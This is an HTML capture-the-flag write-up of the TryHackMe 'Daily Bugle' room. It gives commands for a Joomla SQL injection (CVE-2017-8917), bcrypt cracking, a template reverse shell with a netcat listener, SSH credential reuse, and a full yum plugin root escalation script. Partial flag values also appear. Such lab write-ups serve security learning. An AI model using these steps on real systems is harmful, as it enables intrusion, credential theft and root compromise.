@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daily Bugle | JackHacksStuff</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body class="room-hard">
+
+<div class="rail">
+  <a class="rail-logo" href="../index.html">Jack<span>Hacks</span>Stuff</a>
+  <div class="rail-toc" id="railToc">
+    <div class="rail-line"></div>
+    <div class="rail-tick active" data-heading="overview"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="recon"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="sqli"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="foothold"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="privesc"></div>
+    <div class="rail-line"></div>
+    <div class="rail-tick" data-heading="verdict"></div>
+    <div class="rail-line"></div>
+  </div>
+  <div class="rail-bottom">Hard</div>
+</div>
+
+<main>
+  <nav>
+    <a href="../writeups.html" class="nav-back">← Write-ups</a>
+    <div class="nav-meta">
+      <span>TryHackMe</span>
+      <span class="nav-badge hard">Hard</span>
+    </div>
+  </nav>
+
+  <div class="wu-header">
+    <div class="wu-eyebrow">// TryHackMe · Linux · Joomla SQLi → Template RCE → yum privesc</div>
+    <h1 class="wu-title">Daily Bugle</h1>
+    <div class="wu-meta-row">
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Date</span>
+        <span class="wu-meta-value">2026-09-29</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Difficulty</span>
+        <span class="wu-meta-value accent hard">Hard</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Flags</span>
+        <span class="wu-meta-value">2</span>
+      </div>
+      <div class="wu-meta-item">
+        <span class="wu-meta-label">Platform</span>
+        <span class="wu-meta-value">TryHackMe</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="tool-row">
+    <span class="tool-tag">nmap</span>
+    <span class="tool-tag">gobuster</span>
+    <span class="tool-tag">joomscan</span>
+    <span class="tool-tag">Joomblah</span>
+    <span class="tool-tag">john</span>
+    <span class="tool-tag">CVE-2017-8917</span>
+    <span class="tool-tag">GTFOBins</span>
+  </div>
+
+  <div class="wu-body">
+
+    <h2 id="overview">// Overview</h2>
+    <p><strong>Daily Bugle</strong> is a Spider-Man-themed Linux box built around a vulnerable <strong>Joomla 3.7.0</strong> install. The path runs from a version fingerprint to a public SQL injection (CVE-2017-8917), dumps the user table, cracks a bcrypt hash, and pivots through a Joomla template into a reverse shell. Root is a textbook <strong>GTFOBins <code>yum</code></strong> escalation.</p>
+    <p><a href="https://tryhackme.com/room/dailybugle" target="_blank">View room on TryHackMe →</a></p>
+    <p><em>Flags, credentials, and puzzle answers have been redacted per TryHackMe's write-up policy.</em></p>
+
+    <figure class="screenshot">
+      <img src="../images/dailybugle/homepage.png" alt="Daily Bugle homepage with Spider-Man robs bank headline" />
+      <figcaption>Figure 1: The Daily Bugle homepage — the headline is the answer to Q1.</figcaption>
+    </figure>
+
+    <h2 id="recon">// Reconnaissance</h2>
+
+    <h3>Port Scanning</h3>
+    <p>A standard script and version scan exposes three services — SSH, HTTP, and MySQL:</p>
+
+    <pre>$ nmap -sC -sV &lt;target_ip&gt;
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
+80/tcp   open  http    Apache httpd 2.4.18
+3306/tcp open  mysql   MySQL 5.5.5-10.1.31-MariaDB</pre>
+
+    <h3>Web Enumeration</h3>
+    <p>Port 80 serves a news site. Directory brute-forcing with Gobuster turns up the standard Joomla footprint:</p>
+
+    <pre>$ gobuster dir -u http://&lt;target_ip&gt; -w /usr/share/wordlists/dirb/common.txt
+
+/administrator
+/components
+/images
+/language
+/media
+/modules
+/plugins
+/templates
+...</pre>
+
+    <p>Confirming the CMS version is the next step. The canonical source is the Joomla manifest, which returns the exact core version in a plain XML file:</p>
+
+    <pre>$ curl -s http://&lt;target_ip&gt;/administrator/manifests/files/joomla.xml | grep version
+&lt;version&gt;3.7.0&lt;/version&gt;</pre>
+
+    <p>If the manifest is blocked or missing, the language file at <code>/language/en-GB/en-GB.xml</code> serves as a reliable fallback — it contains a version tag that mirrors the core release.</p>
+
+    <h2 id="sqli">// CVE-2017-8917 — Joomla SQL Injection</h2>
+
+    <p>Joomla 3.7.0 ships with an unauthenticated SQL injection in the <code>com_fields</code> component. A quick <code>searchsploit</code> lookup confirms it:</p>
+
+    <pre>$ searchsploit joomla 3.7.0
+Joomla! 3.7.0 - 'com_fields' SQL Injection</pre>
+
+    <p>Rather than hand-rolling a union query, I used <strong>Joomblah</strong>, a Python PoC that dumps the <code>#__users</code> table and extracts the bcrypt hash for each account. On this instance, only one user is registered:</p>
+
+    <pre>$ python3 joomblah.py http://&lt;target_ip&gt;
+
+[-] Found user: jonah, hash: $2y$10$[redacted]</pre>
+
+    <p>The hash goes straight into John with the bcrypt format and rockyou:</p>
+
+    <pre>$ john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+[redacted]     (jonah)</pre>
+
+    <p>Bcrypt is a deliberately slow hashing algorithm — it's designed to resist brute force, so cracking takes time. On a CPU, expect 20–30 minutes. Hashcat with GPU acceleration (<code>hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code>) cuts that down significantly.</p>
+
+    <h2 id="foothold">// Foothold — Joomla Template RCE</h2>
+
+    <p>With admin credentials in hand, the fastest route to a shell is the theme editor. Under <strong>Extensions → Templates → Templates → Protostar</strong>, Joomla lets you edit PHP files directly. I dropped a PHP reverse shell into <code>index.php</code>:</p>
+
+    <figure class="screenshot">
+      <img src="../images/dailybugle/template-editor.png" alt="Joomla template editor with reverse shell payload" />
+      <figcaption>Figure 2: The Joomla template editor — the reverse shell payload is pasted into <code>index.php</code>.</figcaption>
+    </figure>
+
+    <pre>$ nc -lvnp 4444</pre>
+
+    <p>Then requested the file to trigger it:</p>
+
+    <pre>http://&lt;target_ip&gt;/templates/protostar/index.php</pre>
+
+    <p>A callback lands as <code>apache</code> — the web server user on this instance.</p>
+
+    <p>From there, <code>/var/www/html/configuration.php</code> leaks the database credentials. The password is labeled for the <strong>root</strong> database user, but password reuse is the most common lateral movement vector on these boxes. During enumeration I noticed a home directory for <code>jjameson</code> — worth trying the leaked credentials against that account:</p>
+
+    <pre>$ ssh jjameson@&lt;target_ip&gt;
+jjameson@&lt;target_ip&gt;'s password: [redacted]
+jjameson@dailybugle:~$</pre>
+
+    <p>The user flag is in jjameson's home directory:</p>
+
+    <pre>$ cat ~/user.txt
+[redacted]</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">Q4 answer — user.txt</span>
+      <span class="flag-value">27a260...</span>
+    </div>
+
+    <h2 id="privesc">// Privilege Escalation — yum (GTFOBins)</h2>
+
+    <p>A quick <code>sudo -l</code> shows jjameson can run <code>yum</code> as root without a password:</p>
+
+    <pre>$ sudo -l
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum</pre>
+
+    <p>This is a known GTFOBins entry. <code>yum</code> loads plugins from directories it trusts, and if you control the config file, you can point it at a plugin you wrote. Plugins execute as the invoking user — root, in this case :</p>
+
+    <pre>$ TF=$(mktemp -d)
+$ cat >$TF/x <<EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+
+$ cat >$TF/y.conf &lt;&lt;EOF
+[main]
+enabled=1
+EOF
+
+$ cat >$TF/y.py &lt&ltEOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+    os.execl('/bin/sh','/bin/sh')
+EOF
+
+$ sudo yum -c $TF/x --enableplugin=y
+# id
+uid=0(root) gid=0(root) groups=0(root)</pre>
+
+    <p>From the root shell, the final flag:</p>
+
+    <pre># cat /root/root.txt
+[redacted]</pre>
+
+    <div class="flag-box">
+      <span class="flag-label">Q5 answer — user.txt</span>
+      <span class="flag-value">eec3d5...</span>
+    </div>
+
+    <div class="note">
+      <strong>Why this works:</strong> <code>yum</code> honors a custom plugin path and config path via <code>-c</code>. The plugin's <code>init_hook</code> runs during yum's initialization, and since we invoked yum through sudo, that code executes as root. This is a textbook example of why <code>sudo -l</code> should be one of the first post-foothold checks.
+    </div>
+
+    <h2 id="verdict">// Verdict</h2>
+    <p>Daily Bugle is a clean introduction to the "fingerprint → public exploit → crack → pivot → GTFOBins" chain that shows up constantly on easy Linux boxes. The Joomla SQLi is a one-command win, but the interesting parts are the template RCE and the credential reuse between <code>configuration.php</code> and SSH. The <code>yum</code> privesc is a good reminder to run <code>sudo -l</code> before anything else — it's a two-minute check that shortcuts a lot of guesswork.</p>
+    <p style="color: var(--text); font-size: 0.8rem;">
+      <span style="color: var(--room-accent, var(--accent));">→</span> 7/10 — recommended as a first "real" web-to-root box. The SQLi step is trivial, so the learning value is concentrated in the pivot and privesc.
+    </p>
+
+  </div>
+
+  <div class="wu-footer">
+    <a href="brainpan.html" class="footer-nav-link prev">
+      <span class="footer-nav-label">← Previous</span>
+      <span class="footer-nav-title">Brainpan 1</span>
+    </a>
+    <div class="footer-center">
+      <a href="../writeups.html">All write-ups</a>
+    </div>
+    <a href="gamingserver.html" class="footer-nav-link next">
+      <span class="footer-nav-label">Next →</span>
+      <span class="footer-nav-title">GamingServer</span>
+    </a>
+  </div>
+
+</main>
+
+<script src="../js/script.js"></script>
+
+</body>
+</html>
